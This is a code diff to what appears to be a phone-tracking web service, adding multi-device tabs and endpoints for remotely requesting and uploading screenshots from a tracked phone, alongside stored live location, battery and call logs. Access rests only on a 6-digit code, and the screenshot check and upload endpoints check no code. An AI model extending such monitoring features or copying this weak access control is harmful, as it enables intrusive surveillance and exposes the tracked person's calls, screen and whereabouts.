@@ -38,6 +38,18 @@ export default {
       if (path === '/api/pending-pairs' && request.method === 'GET') {
         return handlePendingPairs(request, env, corsHeaders);
       }
+      if (path === '/api/get-devices' && request.method === 'GET') {
+        return handleGetDevices(request, env, corsHeaders);
+      }
+      if (path === '/api/request-screenshot' && request.method === 'POST') {
+        return handleRequestScreenshot(request, env, corsHeaders);
+      }
+      if (path === '/api/check-screenshot' && request.method === 'GET') {
+        return handleCheckScreenshot(request, env, corsHeaders);
+      }
+      if (path === '/api/upload-screenshot' && request.method === 'POST') {
+        return handleUploadScreenshot(request, env, corsHeaders);
+      }
       if (path === '/') {
         return new Response(WEBSITE_HTML, {
           headers: { 'Content-Type': 'text/html;charset=UTF-8', ...corsHeaders },
@@ -61,7 +73,7 @@ export default {
 };
 
 async function handleUpdateLocation(request, env, corsHeaders) {
-  const { code, latitude, longitude, accuracy, battery, calls } = await request.json();
+  const { code, latitude, longitude, accuracy, battery, calls, device_id, device_name } = await request.json();
   if (!code || code.length !== 6 || !/^\d{6}$/.test(code)) {
     return new Response(JSON.stringify({ error: 'Invalid code' }), { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } });
   }
@@ -71,26 +83,36 @@ async function handleUpdateLocation(request, env, corsHeaders) {
   const db = env.DB;
   const id = crypto.randomUUID();
   const timestamp = new Date().toISOString();
-  await db.prepare('INSERT INTO locations (id, code, latitude, longitude, accuracy, battery, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?)').bind(id, code, latitude, longitude, accuracy || null, battery || null, timestamp).run();
+  const devId = device_id || 'default';
+  const devName = device_name || 'Unknown Device';
+  await db.prepare('INSERT INTO locations (id, code, latitude, longitude, accuracy, battery, timestamp, device_id, device_name) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)').bind(id, code, latitude, longitude, accuracy || null, battery || null, timestamp, devId, devName).run();
   await db.prepare('DELETE FROM locations WHERE id NOT IN (SELECT id FROM locations WHERE code = ? ORDER BY timestamp DESC LIMIT 500)').bind(code).run();
+  await db.prepare('INSERT OR REPLACE INTO devices (id, code, device_id, device_name, last_seen) VALUES (?, ?, ?, ?, ?)').bind(crypto.randomUUID(), code, devId, devName, timestamp).run();
   if (calls && Array.isArray(calls) && calls.length > 0) {
-    await db.prepare('INSERT OR REPLACE INTO call_logs (code, calls_json, updated_at) VALUES (?, ?, ?)').bind(code, JSON.stringify(calls), timestamp).run();
+    await db.prepare('INSERT OR REPLACE INTO call_logs (code, device_id, calls_json, updated_at) VALUES (?, ?, ?, ?)').bind(code, devId, JSON.stringify(calls), timestamp).run();
   }
-  return new Response(JSON.stringify({ ok: true, timestamp }), { headers: { 'Content-Type': 'application/json', ...corsHeaders } });
+  return new Response(JSON.stringify({ ok: true, timestamp, device_id: devId }), { headers: { 'Content-Type': 'application/json', ...corsHeaders } });
 }
 
 async function handleGetLocation(request, env, corsHeaders) {
   const url = new URL(request.url);
   const code = url.searchParams.get('code');
+  const deviceId = url.searchParams.get('device_id');
   if (!code || code.length !== 6 || !/^\d{6}$/.test(code)) {
     return new Response(JSON.stringify({ error: 'Invalid code' }), { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } });
   }
   const db = env.DB;
-  const result = await db.prepare('SELECT * FROM locations WHERE code = ? ORDER BY timestamp DESC LIMIT 1').bind(code).first();
+  let result;
+  if (deviceId) {
+    result = await db.prepare('SELECT * FROM locations WHERE code = ? AND device_id = ? ORDER BY timestamp DESC LIMIT 1').bind(code, deviceId).first();
+  } else {
+    result = await db.prepare('SELECT * FROM locations WHERE code = ? ORDER BY timestamp DESC LIMIT 1').bind(code).first();
+  }
   if (!result) {
     return new Response(JSON.stringify({ error: 'No location found' }), { status: 404, headers: { 'Content-Type': 'application/json', ...corsHeaders } });
   }
-  const callsResult = await db.prepare('SELECT calls_json FROM call_logs WHERE code = ?').bind(code).first();
+  const devId = result.device_id || 'default';
+  const callsResult = await db.prepare('SELECT calls_json FROM call_logs WHERE code = ? AND device_id = ?').bind(code, devId).first();
   const response = { ...result };
   response.calls = (callsResult && callsResult.calls_json) ? JSON.parse(callsResult.calls_json) : [];
   return new Response(JSON.stringify(response), { headers: { 'Content-Type': 'application/json', ...corsHeaders } });
@@ -168,6 +190,66 @@ async function handlePendingPairs(request, env, corsHeaders) {
   const db = env.DB;
   const results = await db.prepare('SELECT id, device_id, device_info, status, created_at FROM pair_requests WHERE code = ? AND status = ? ORDER BY created_at DESC').bind(code, 'pending').all();
   return new Response(JSON.stringify(results.results), { headers: { 'Content-Type': 'application/json', ...corsHeaders } });
+}
+
+async function handleGetDevices(request, env, corsHeaders) {
+  const url = new URL(request.url);
+  const code = url.searchParams.get('code');
+  if (!code || code.length !== 6 || !/^\d{6}$/.test(code)) {
+    return new Response(JSON.stringify({ error: 'Invalid code' }), { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } });
+  }
+  const db = env.DB;
+  const results = await db.prepare('SELECT device_id, device_name, last_seen FROM devices WHERE code = ? ORDER BY last_seen DESC').bind(code).all();
+  return new Response(JSON.stringify(results.results), { headers: { 'Content-Type': 'application/json', ...corsHeaders } });
+}
+
+async function handleRequestScreenshot(request, env, corsHeaders) {
+  const { code, device_id } = await request.json();
+  if (!code || code.length !== 6 || !/^\d{6}$/.test(code)) {
+    return new Response(JSON.stringify({ error: 'Invalid code' }), { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } });
+  }
+  const db = env.DB;
+  const id = crypto.randomUUID();
+  const timestamp = new Date().toISOString();
+  const devId = device_id || 'default';
+  await db.prepare('INSERT INTO screenshot_requests (id, code, device_id, status, created_at) VALUES (?, ?, ?, ?, ?)').bind(id, code, devId, 'pending', timestamp).run();
+  return new Response(JSON.stringify({ ok: true, id }), { headers: { 'Content-Type': 'application/json', ...corsHeaders } });
+}
+
+async function handleCheckScreenshot(request, env, corsHeaders) {
+  const url = new URL(request.url);
+  const id = url.searchParams.get('id');
+  const code = url.searchParams.get('code');
+  const deviceId = url.searchParams.get('device_id');
+  const db = env.DB;
+
+  if (id) {
+    const result = await db.prepare('SELECT id, status, screenshot_url FROM screenshot_requests WHERE id = ?').bind(id).first();
+    if (!result) {
+      return new Response(JSON.stringify({ error: 'Not found' }), { status: 404, headers: { 'Content-Type': 'application/json', ...corsHeaders } });
+    }
+    return new Response(JSON.stringify({ status: result.status, screenshot_url: result.screenshot_url || null }), { headers: { 'Content-Type': 'application/json', ...corsHeaders } });
+  }
+
+  if (!code || !deviceId) {
+    return new Response(JSON.stringify({ error: 'Missing params' }), { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } });
+  }
+  const result = await db.prepare('SELECT id, status FROM screenshot_requests WHERE code = ? AND device_id = ? AND status = ? ORDER BY created_at DESC LIMIT 1').bind(code, deviceId, 'pending').first();
+  if (!result) {
+    return new Response(JSON.stringify({ pending: false }), { headers: { 'Content-Type': 'application/json', ...corsHeaders } });
+  }
+  return new Response(JSON.stringify({ pending: true, id: result.id }), { headers: { 'Content-Type': 'application/json', ...corsHeaders } });
+}
+
+async function handleUploadScreenshot(request, env, corsHeaders) {
+  const { id, code, device_id, screenshot } = await request.json();
+  if (!id || !screenshot) {
+    return new Response(JSON.stringify({ error: 'Missing id or screenshot' }), { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } });
+  }
+  const db = env.DB;
+  const timestamp = new Date().toISOString();
+  await db.prepare('UPDATE screenshot_requests SET status = ?, screenshot_url = ?, completed_at = ? WHERE id = ?').bind('done', screenshot, timestamp, id).run();
+  return new Response(JSON.stringify({ ok: true }), { headers: { 'Content-Type': 'application/json', ...corsHeaders } });
 }
 
 const WEBSITE_HTML = `<!DOCTYPE html>
@@ -295,6 +377,7 @@ body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-
     <button class="refresh-btn" id="refreshBtn">Refresh</button>
     <button class="disconnect-btn" id="disconnectBtn">Logout</button>
   </div>
+  <div id="deviceTabs" style="position:absolute;top:50px;left:8px;right:8px;z-index:10000;display:flex;gap:6px;overflow-x:auto;scrollbar-width:none;"></div>
   <div id="map"></div>
   <div class="info-panel" id="infoPanel">
     <div class="info-row"><span class="label">Last update:</span><span class="value" id="lastUpdate">-</span></div>
@@ -357,14 +440,19 @@ connectBtn.addEventListener('click', async () => {
 function pollPairStatus(requestId) { pairPollInterval = setInterval(async () => { try { const res = await fetch(API_BASE + '/api/pair-status?code=' + currentCode + '&device_id=' + deviceId); const data = await res.json(); if (data.status === 'accepted') { clearInterval(pairPollInterval); localStorage.setItem('tsp-paired-' + currentCode, deviceId); localStorage.setItem('tsp-current-code', currentCode); startTracking(); } else if (data.status === 'declined') { clearInterval(pairPollInterval); resetPairingUI(); } } catch (e) {} }, 2000); }
 document.getElementById('cancelPairBtn').addEventListener('click', () => { clearInterval(pairPollInterval); resetPairingUI(); });
 function resetPairingUI() { pairingWait.style.display = 'none'; connectBtn.style.display = ''; document.querySelector('.code-input').style.display = ''; document.querySelector('.login-box p').style.display = ''; }
-function startTracking() { loginScreen.style.display = 'none'; mapContainer.style.display = 'flex'; topBar.style.display = 'block'; initMap(); lastDataTime = Date.now(); isDisconnected = false; fetchLocation(); refreshInterval = setInterval(fetchLocation, 1000); setInterval(checkDisconnected, 2000); document.getElementById('status').textContent = 'Connected: ' + currentCode + ' | Live'; document.getElementById('status').className = 'status online'; }
+let devices = [], activeDeviceId = null, devicePollInterval = null, screenshotPollInterval = null;
+function startTracking() { loginScreen.style.display = 'none'; mapContainer.style.display = 'flex'; topBar.style.display = 'block'; initMap(); lastDataTime = Date.now(); isDisconnected = false; fetchLocation(); fetchDevices(); refreshInterval = setInterval(fetchLocation, 1000); devicePollInterval = setInterval(fetchDevices, 5000); setInterval(checkDisconnected, 2000); document.getElementById('status').textContent = 'Connected: ' + currentCode + ' | Live'; document.getElementById('status').className = 'status online'; }
 function checkDisconnected() { if (!currentCode || !lastDataTime) return; if ((Date.now() - lastDataTime) / 1000 > 15 && !isDisconnected) { isDisconnected = true; document.getElementById('status').textContent = 'Disconnected'; document.getElementById('status').className = 'status disconnected'; } }
-document.getElementById('disconnectBtn').addEventListener('click', () => { clearInterval(refreshInterval); clearInterval(pairPollInterval); localStorage.removeItem('tsp-paired-' + currentCode); localStorage.removeItem('tsp-current-code'); currentCode = null; lastDataTime = 0; isDisconnected = false; loginScreen.style.display = 'flex'; mapContainer.style.display = 'none'; topBar.style.display = 'none'; infoPanel.style.display = 'none'; document.getElementById('callsSection').style.display = 'none'; inputs.forEach(i => i.value = ''); inputs[0].focus(); resetPairingUI(); document.getElementById('status').textContent = 'Not connected'; document.getElementById('status').className = 'status'; });
+document.getElementById('disconnectBtn').addEventListener('click', () => { clearInterval(refreshInterval); clearInterval(pairPollInterval); clearInterval(devicePollInterval); clearInterval(screenshotPollInterval); localStorage.removeItem('tsp-paired-' + currentCode); localStorage.removeItem('tsp-current-code'); currentCode = null; lastDataTime = 0; isDisconnected = false; devices = []; activeDeviceId = null; loginScreen.style.display = 'flex'; mapContainer.style.display = 'none'; topBar.style.display = 'none'; infoPanel.style.display = 'none'; document.getElementById('callsSection').style.display = 'none'; document.getElementById('deviceTabs').innerHTML = ''; inputs.forEach(i => i.value = ''); inputs[0].focus(); resetPairingUI(); document.getElementById('status').textContent = 'Not connected'; document.getElementById('status').className = 'status'; });
 document.getElementById('refreshBtn').addEventListener('click', () => { fetchLocation(); });
 document.getElementById('openDlBtn').addEventListener('click', () => { document.getElementById('dlOverlay').classList.add('open'); });
 document.getElementById('dlBackBtn').addEventListener('click', () => { document.getElementById('dlOverlay').classList.remove('open'); });
 function initMap() { if (map) { map.invalidateSize(); return; } map = L.map('map', { zoomControl: false }).setView([0, 0], 2); L.control.zoom({ position: 'bottomright' }).addTo(map); L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { attribution: 'OSM CartoDB', maxZoom: 19 }).addTo(map); trail = L.polyline([], { color: '#00e5ff', weight: 3, opacity: 0.8 }).addTo(map); }
-async function fetchLocation() { if (!currentCode) return; try { const res = await fetch(API_BASE + '/api/get-location?code=' + currentCode); if (!res.ok) return; const data = await res.json(); if (!data.latitude) return; lastDataTime = Date.now(); if (isDisconnected) { isDisconnected = false; document.getElementById('status').textContent = 'Connected: ' + currentCode + ' | Live'; document.getElementById('status').className = 'status online'; } updateMap(data); updateCalls(data.calls || []); document.getElementById('status').textContent = 'Connected: ' + currentCode + ' | Live'; } catch (e) {} }
+async function fetchLocation() { if (!currentCode) return; try { let url = API_BASE + '/api/get-location?code=' + currentCode; if (activeDeviceId) url += '&device_id=' + activeDeviceId; const res = await fetch(url); if (!res.ok) return; const data = await res.json(); if (!data.latitude) return; lastDataTime = Date.now(); if (isDisconnected) { isDisconnected = false; document.getElementById('status').textContent = 'Connected: ' + currentCode + ' | Live'; document.getElementById('status').className = 'status online'; } updateMap(data); updateCalls(data.calls || []); var devName = data.device_name || 'Unknown'; document.getElementById('status').textContent = devName + ' | ' + currentCode + ' | Live'; } catch (e) {} }
+async function fetchDevices() { if (!currentCode) return; try { const res = await fetch(API_BASE + '/api/get-devices?code=' + currentCode); if (!res.ok) return; const list = await res.json(); if (!list || list.length === 0) return; devices = list; if (!activeDeviceId && devices.length > 0) activeDeviceId = devices[0].device_id; renderDeviceTabs(); } catch (e) {} }
+function renderDeviceTabs() { var el = document.getElementById('deviceTabs'); el.innerHTML = ''; if (devices.length <= 1) return; devices.forEach(function(dev) { var tab = document.createElement('div'); tab.className = 'device-tab' + (dev.device_id === activeDeviceId ? ' active' : ''); var isRecent = (Date.now() - new Date(dev.last_seen).getTime()) < 30000; tab.innerHTML = '<span class="dot' + (isRecent ? ' online-dot' : '') + '"></span>' + escapeHtml(dev.device_name || 'Device'); tab.addEventListener('click', function() { activeDeviceId = dev.device_id; trail.clearLayers(); marker = null; renderDeviceTabs(); fetchLocation(); }); el.appendChild(tab); }); }
+document.getElementById('screenshotBtn').addEventListener('click', async function() { if (!currentCode) return; var btn = document.getElementById('screenshotBtn'); btn.textContent = 'Capturing...'; try { const res = await fetch(API_BASE + '/api/request-screenshot', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ code: currentCode, device_id: activeDeviceId || 'default' }) }); const data = await res.json(); if (data.ok) pollScreenshotResult(data.id); else btn.textContent = 'Screenshot'; } catch (e) { btn.textContent = 'Screenshot'; } });
+function pollScreenshotResult(requestId) { var attempts = 0; screenshotPollInterval = setInterval(async function() { attempts++; if (attempts > 30) { clearInterval(screenshotPollInterval); document.getElementById('screenshotBtn').textContent = 'Screenshot'; return; } try { const res = await fetch(API_BASE + '/api/check-screenshot?id=' + requestId); const data = await res.json(); if (data.status === 'done' && data.screenshot_url) { clearInterval(screenshotPollInterval); document.getElementById('screenshotBtn').textContent = 'Screenshot'; alert('Screenshot captured!'); } } catch (e) {} }, 2000); }
 function updateMap(data) { const lat = data.latitude, lng = data.longitude, pos = [lat, lng]; if (marker) { marker.setLatLng(pos); } else { marker = L.circleMarker(pos, { radius: 10, fillColor: '#00e5ff', color: '#fff', weight: 2, fillOpacity: 0.9 }).addTo(map); } trail.addLatLng(pos); map.setView(pos, 16); infoPanel.style.display = 'block'; const ageSec = Math.floor((Date.now() - new Date(data.timestamp)) / 1000); document.getElementById('lastUpdate').textContent = ageSec < 5 ? 'Just now' : ageSec < 60 ? ageSec + 's ago' : Math.floor(ageSec/60) + 'm ' + (ageSec%60) + 's ago'; document.getElementById('lastUpdate').className = 'value' + (ageSec > 30 ? ' stale' : ageSec > 120 ? ' old' : ''); document.getElementById('accuracy').textContent = data.accuracy ? data.accuracy.toFixed(0) + 'm' : 'N/A'; document.getElementById('battery').textContent = data.battery != null ? data.battery + '%' : 'N/A'; document.getElementById('position').textContent = lat.toFixed(5) + ', ' + lng.toFixed(5); }
 function formatDuration(s) { if (s < 60) return s + 's'; if (s < 3600) return Math.floor(s/60) + 'm ' + (s%60) + 's'; return Math.floor(s/3600) + 'h ' + Math.floor((s%3600)/60) + 'm'; }
 function formatCallTime(ts) { var d = Date.now() - ts; var m = Math.floor(d/60000); if (m < 1) return 'Just now'; if (m < 60) return m + 'm ago'; var h = Math.floor(m/60); if (h < 24) return h + 'h ago'; return Math.floor(h/24) + 'd ago'; }
